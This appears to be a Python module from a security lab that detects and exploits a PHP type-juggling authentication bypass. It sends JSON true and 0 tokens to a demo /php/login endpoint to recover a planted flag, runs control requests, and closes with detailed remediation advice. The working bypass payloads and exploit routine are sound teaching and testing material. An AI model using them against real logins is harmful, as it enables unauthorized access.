"""PHP loose-comparison (type juggling) authentication bypass.

WHAT IT IS
----------
The demo app exposes a token-gated API login at ``POST /php/login`` that takes
a JSON body ``{"token": <value>}`` and checks it against a server-side secret
with PHP's *loose* equality operator (``==``) rather than an identity check
(``===``) or a constant-time string compare::

    $EXPECTED = "s3cret-signing-token";              // a non-empty, NON-numeric string
    def _php_login(h):                               // POST /php/login
        token = json_body(h).get("token")
        if php_loose_equals(token, $EXPECTED):       // VULN: PHP '==' coercion
            return 200  {"flag": ...}
        return 403  {"status": "denied"}

In PHP 5/7, ``==`` coerces its operands *before* comparing them, and the rules
are surprising:

* **bool on either side -> both sides are coerced to bool.** The secret is a
  non-empty string, which is *truthy*, so ``"s3cret-signing-token" == true`` is
  ``true == true`` -> **true**. A JSON ``true`` (a real boolean, not the string
  ``"true"``) therefore authenticates without knowing the token at all.
* **int vs string -> the string is coerced to a number (pre-PHP-8).** A
  non-numeric string like the secret coerces to ``0``, so ``0 == "s3cret-..."``
  is ``0 == 0`` -> **true**. A JSON ``0`` (a real integer) therefore also
  authenticates. (``1`` does NOT: ``1 == 0`` is false -- a clean differential
  that proves the coercion, not a wildcard "anything passes".)

Both bypasses depend on the attacker controlling the *JSON type*, which is
trivial: ``{"token": true}`` and ``{"token": 0}`` send a real bool / int, while
``{"token": "true"}`` / ``{"token": "0"}`` send strings and are correctly
rejected. The prize is :data:`C.FLAGS["php_type_juggling"]`, returned in the
``flag`` field of the 200 response when the bypass lands.

  PHP 8 NOTE: PHP 8 changed string<->number juggling -- a non-numeric string is
  no longer coerced to ``0`` for ``int == string``; instead the *int* is coerced
  to string, so ``0 == "s3cret-..."`` is now ``"0" == "s3cret-..."`` -> **false**.
  The ``0``-token bypass is therefore a PHP 5/7 bug, fixed in PHP 8. The
  ``true``-token bypass (``bool == string`` -> bool) is UNCHANGED in PHP 8 and
  still works -- only ``===`` / a real string compare stops it. The lab models
  the still-widely-deployed PHP 5/7 ``==`` semantics that this technique targets.

HOW WE DISCOVER IT
------------------
Three differential signals confirm a real, exploitable loose-comparison bypass
(not a backdoor that accepts everything):

1.  **A correct-looking WRONG string is rejected (the control).** ``POST
    /php/login`` with ``token="wrong-token"`` (a plausible but incorrect
    *string*) returns HTTP 403 -- proof the endpoint actually validates the
    token for same-type input, so a bypass is a real auth bypass.
2.  **A real JSON bool ``true`` authenticates (bypass #1).** ``{"token": true}``
    returns HTTP 200 with the flag, while ``{"token": "true"}`` (the *string*)
    is rejected -- the difference is purely the JSON type, the signature of
    ``bool == string`` coercion.
3.  **A real JSON int ``0`` authenticates (bypass #2) but ``1`` does not.**
    ``{"token": 0}`` returns 200 while ``{"token": 1}`` returns 403 -- exactly
    the ``0 == non-numeric-string`` coercion, and the ``1`` counter-example
    rules out "the server just accepts any number".

HOW WE EXPLOIT IT
-----------------
We send each type-juggling payload (``true`` then ``0``) to ``POST /php/login``
and scrape the ``flag`` field out of the first 200 response, recovering
:data:`C.FLAGS["php_type_juggling"]` without ever knowing the real token.

THE FIX
-------
See :data:`REMEDIATION`. In one line: compare secret tokens with the identity
operator ``===`` (or, better, a constant-time compare like ``hash_equals()``),
after asserting the input is a string of the expected type -- never with the
loose ``==``, which coerces types and turns ``true`` / ``0`` into skeleton keys.
"""
from __future__ import annotations

from typing import Any, Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never authenticate with PHP's loose '==' operator. PHP 5/7 '==' coerces "
    "operands before comparing: 'bool == string' compares booleans (a non-empty "
    "secret == true), and 'int == string' coerces the string to a number "
    "(0 == 'any-non-numeric-string'), so a client-supplied JSON true or 0 "
    "bypasses a token/password check entirely. FIX: (1) compare secrets with "
    "the IDENTITY operator '===' (and '!==') so both VALUE and TYPE must match, "
    "or better use a constant-time comparison built for secrets -- PHP "
    "hash_equals($known, $supplied) -- to also resist timing attacks; "
    "(2) before comparing, assert the input is the expected type and reject "
    "anything that is not a string, e.g. is_string($token) (decoded JSON gives "
    "real bool/int/null/array types, so an untyped value must be refused, not "
    "coerced); (3) for passwords, never compare hashes with '==' (md5/sha1 "
    "'0e...' digests loose-compare as numeric zero -- the magic-hash bug) -- use "
    "password_hash()/password_verify() with bcrypt/argon2; (4) prefer strict, "
    "typed comparisons throughout and enable strict types (declare(strict_types=1)). "
    "PHP 8 fixed the 'int == non-numeric-string' coercion (it no longer yields 0), "
    "but 'bool == string' still bypasses, so '===' / hash_equals -- not a runtime "
    "upgrade -- is the real fix. Equivalent care applies in any language whose "
    "'==' is loose (JavaScript ==, etc.): use ===/strict equality for secrets."
)

#: The vulnerable login endpoint (token-gated, compared with PHP loose '==').
ENDPOINT: str = "/php/login"

#: The real secret the endpoint compares against -- a non-empty, NON-numeric
#: string. We never need to know it; it is here only to explain the coercion in
#: the report (truthy => bool bypass; coerces to 0 => int bypass).
EXPECTED_TOKEN: str = "s3cret-signing-token"

#: A plausible but WRONG string. Same-type (string) input is correctly rejected
#: (HTTP 403), proving the endpoint really validates the token -- so the bool/int
#: bypasses below are a genuine auth bypass, not a backdoor that accepts all.
WRONG_TOKEN: str = "wrong-token"

#: The type-juggling payloads, each a real JSON type (bool / int), labelled with
#: the PHP coercion rule it abuses. These are what defeat the loose '=='.
#:   - bool true : 'bool == string' -> _to_bool(secret)==_to_bool(true) -> true
#:   - int 0     : 'int == string'  -> 0 == _to_number(secret)=0 (pre-PHP-8) -> true
JUGGLING_PAYLOADS: List[Tuple[str, Any]] = [
    ("json-bool-true", True),   # {"token": true}  -> non-empty-string == true
    ("json-int-zero", 0),       # {"token": 0}     -> 0 == non-numeric-string
]

#: Same-VALUE-looking decoys sent as STRINGS that MUST be rejected -- they prove
#: the bypass is the JSON *type*, not the spelling: "true"/"0" are plain strings,
#: loose-equal to the secret only if they literally match it (they don't).
TYPE_DECOYS: List[Tuple[str, Any]] = [
    ("string-true", "true"),    # {"token": "true"} -> string != secret -> 403
    ("string-zero", "0"),       # {"token": "0"}    -> string != secret -> 403
]

#: A real JSON int that does NOT bypass: 1 != _to_number(secret)=0 -> 403. This
#: counter-example proves the int bypass is the 0-coercion, not "any number".
NONBYPASS_INT: Tuple[str, Any] = ("json-int-one", 1)

#: Everything the engine submits (public so the CLI/report can show what was
#: tried): the wrong-string control, the bypass payloads, the string decoys, and
#: the non-bypassing int counter-example.
PAYLOADS: List[str] = (
    [f'{{"token": {WRONG_TOKEN!r}}}']
    + [f'{{"token": {str(v).lower() if isinstance(v, bool) else v}}}'
       for _label, v in JUGGLING_PAYLOADS]
    + [f'{{"token": {v!r}}}' for _label, v in TYPE_DECOYS]
    + [f'{{"token": {NONBYPASS_INT[1]}}}']
)


# --- low-level probe ---------------------------------------------------------
def _login(client: WebClient, token: Any) -> Response:
    """Drive the login sink: ``POST /php/login`` with the given JSON ``token``.

    ``token`` is sent as a real JSON value, so its Python type (bool/int/str)
    becomes the JSON type the server's PHP ``==`` then coerces.
    """
    return client.post(ENDPOINT, json={"token": token})


def _flag_from(resp: Response) -> Optional[str]:
    """Return the planted flag if this is an authenticated (bypassed) response."""
    if resp.status == 200 and C.FLAGS["php_type_juggling"] in resp.text:
        try:
            body = resp.json()
        except ValueError:
            return None
        flag = body.get("flag") if isinstance(body, dict) else None
        if flag == C.FLAGS["php_type_juggling"]:
            return flag
    return None


def _bypassed(resp: Response) -> bool:
    """True if the response authenticated (HTTP 200 carrying the flag)."""
    return _flag_from(resp) is not None


# --- detection ---------------------------------------------------------------
def detect_wrong_string_rejected(
    client: WebClient, token: str = WRONG_TOKEN
) -> Tuple[bool, str]:
    """Control: a correct-looking WRONG *string* is rejected (HTTP 403).

    ``POST /php/login`` with ``token="wrong-token"`` returns 403 and no flag --
    proof the endpoint genuinely validates the token for same-type input, so the
    bool/int bypasses are a real auth bypass rather than an accept-all backdoor.
    """
    resp = _login(client, token)
    if resp.status == 403 and not _bypassed(resp):
        return True, (
            f"POST {ENDPOINT} {{\"token\": {token!r}}} (a wrong STRING) was "
            f"rejected (HTTP {resp.status}) -- the token is really validated"
        )
    return False, ""


def detect_bool_bypass(client: WebClient) -> Tuple[bool, str]:
    """Bypass #1: a real JSON bool ``true`` authenticates; the string ``"true"`` does not.

    ``{"token": true}`` -> 200 + flag (``bool == string`` coerces both to bool;
    the non-empty secret is truthy). ``{"token": "true"}`` -> 403 (a plain
    string unequal to the secret). The difference is purely the JSON type.
    """
    yes = _login(client, True)
    decoy = _login(client, "true")
    if _bypassed(yes) and not _bypassed(decoy):
        return True, (
            f"POST {ENDPOINT} {{\"token\": true}} (JSON bool) authenticated "
            f"(HTTP {yes.status}) while {{\"token\": \"true\"}} (string) was "
            f"rejected (HTTP {decoy.status}) -- 'bool == string' coercion: a "
            f"non-empty secret == true"
        )
    return False, ""


def detect_int_bypass(client: WebClient) -> Tuple[bool, str]:
    """Bypass #2: a real JSON ``0`` authenticates but ``1`` does not.

    ``{"token": 0}`` -> 200 + flag (``int == string`` coerces the non-numeric
    secret to ``0``: ``0 == 0``). ``{"token": 1}`` -> 403 (``1 == 0`` is false),
    and ``{"token": "0"}`` -> 403 (a string). The ``1`` counter-example rules
    out an accept-any-number backdoor.
    """
    yes = _login(client, 0)
    one = _login(client, 1)
    decoy = _login(client, "0")
    if _bypassed(yes) and not _bypassed(one) and not _bypassed(decoy):
        return True, (
            f"POST {ENDPOINT} {{\"token\": 0}} (JSON int) authenticated (HTTP "
            f"{yes.status}) while {{\"token\": 1}} (HTTP {one.status}) and "
            f"{{\"token\": \"0\"}} (HTTP {decoy.status}) were rejected -- "
            f"'int == string' coerces the non-numeric secret to 0 (pre-PHP-8)"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_login_bypass(
    client: WebClient,
) -> Tuple[bool, Optional[str], List[Dict[str, str]]]:
    """Send each type-juggling payload and recover the flag from the first bypass.

    Returns ``(ok, flag, attempts)`` where ``attempts`` records each payload
    tried with its label, JSON type, HTTP status, and whether it bypassed (for
    the report); ``flag`` is the recovered ``C.FLAGS["php_type_juggling"]``.
    """
    attempts: List[Dict[str, str]] = []
    flag: Optional[str] = None
    for label, value in JUGGLING_PAYLOADS:
        resp = _login(client, value)
        got = _flag_from(resp)
        if got is not None and flag is None:
            flag = got
        attempts.append(
            {
                "label": label,
                "json_type": type(value).__name__,
                "value": str(value).lower() if isinstance(value, bool) else str(value),
                "status": str(resp.status),
                "bypassed": str(got is not None),
            }
        )
    ok = flag == C.FLAGS["php_type_juggling"]
    return ok, flag, attempts


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the PHP loose-comparison auth bypass, then exploit it (recover the flag).

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["php_type_juggling"]`` plus which type-juggling payloads worked,
    with ``extra`` proving the bypass was real: a wrong string is 403, yet a JSON
    ``true`` and a JSON ``0`` each return 200 with the flag (while ``"true"``,
    ``"0"`` and ``1`` are all rejected -- the type, not the spelling, is the key).
    """
    techniques: List[str] = []

    # 1) Detection / controls ----------------------------------------------
    ctrl_ok, ctrl_ev = detect_wrong_string_rejected(client)
    if ctrl_ok:
        techniques.append("wrong-string-rejected-403")
    bool_ok, bool_ev = detect_bool_bypass(client)
    if bool_ok:
        techniques.append("bool-coercion-bypass")
    int_ok, int_ev = detect_int_bypass(client)
    if int_ok:
        techniques.append("int-coercion-bypass")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, attempts = exploit_login_bypass(client)
    if ok:
        techniques.append("recover-flag")

    # Discovery requires at least one type-juggling bypass to have produced the
    # flag AND the control to prove a real (same-type) token check is present.
    discovered = bool(ok and ctrl_ok and (bool_ok or int_ok))

    working = [a["label"] for a in attempts if a["bypassed"] == "True"]
    first_working = working[0] if working else ""

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if ctrl_ok:
        evidence_parts.append(f"control: {ctrl_ev}")
    if bool_ok:
        evidence_parts.append(f"bool-bypass: {bool_ev}")
    if int_ok:
        evidence_parts.append(f"int-bypass: {int_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": first_working,
        "endpoint": ENDPOINT,
        "expected_token": EXPECTED_TOKEN,
        "wrong_token": WRONG_TOKEN,
        "bool_payload": '{"token": true}',
        "int_payload": '{"token": 0}',
        "working_payloads": working,
        "attempts": attempts,
        "techniques": techniques,
        "php_note": (
            "PHP 5/7 '==' coerces types: 'bool == string' (non-empty secret == "
            "true) and 'int == string' (0 == non-numeric-string). PHP 8 fixed "
            "the int<->string case but 'bool == string' still bypasses; use "
            "'===' / hash_equals()."
        ),
        "summary": (
            f"the endpoint 403'd a wrong STRING ({WRONG_TOKEN!r}) but a JSON bool "
            f"true and a JSON int 0 each authenticated via PHP loose '==' "
            f"coercion (while \"true\", \"0\" and 1 were rejected); recovered "
            f"flag {flag!r} from POST {ENDPOINT} without knowing the real token"
        ),
    }

    return Finding(
        vuln="PHP Type Juggling (loose-comparison auth bypass)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=first_working,
        extra={
            "techniques": techniques,
            "wrong_string_rejected": ctrl_ok,
            "wrong_string_status": 403,
            "bool_bypass": bool_ok,
            "int_bypass": int_ok,
            "flag_recovered": ok,
            "working_payloads": working,
            "expected_token": EXPECTED_TOKEN,
            "wrong_token": WRONG_TOKEN,
            "attempts": attempts,
        },
    )
